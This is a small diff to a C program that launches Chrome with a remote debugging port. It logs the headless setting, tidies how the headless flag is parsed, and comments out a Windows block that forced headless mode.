@@ -185,6 +185,7 @@ void prepare_env(char* data_path)
 int start_chrome(char* chrome_path, char* user_data)
 {
     int chrome_pid = 0;
+    printf("[-] Headless mode: %d\n", headless);
 
 #ifdef _OS_WINDOWS_
     char cmd[512] = {0};
@@ -219,7 +220,7 @@ int start_chrome(char* chrome_path, char* user_data)
     }
 
 #else
-    char* arg1 = headless? "--headless" : "";
+    char* arg1 = headless ? "--headless" : "";
 
     char* arg2 = "--remote-debugging-port="CHROME_DBG_PORT;
 
@@ -340,16 +341,17 @@ int main(int argc, char* argv[])
     }
 #endif
 
-    headless = find_arg(argc, argv, "--headless") != NULL;
-
+    headless = find_arg(argc, argv, "--headless") != NULL ? true : false;
 
 #ifdef _OS_WINDOWS_
 
-    handle_stdout();
+    // handle_stdout();
+    /*
     if (!headless)
     {
-        headless = TRUE;
+        headless = true;
     }
+    */
 
 #else
 
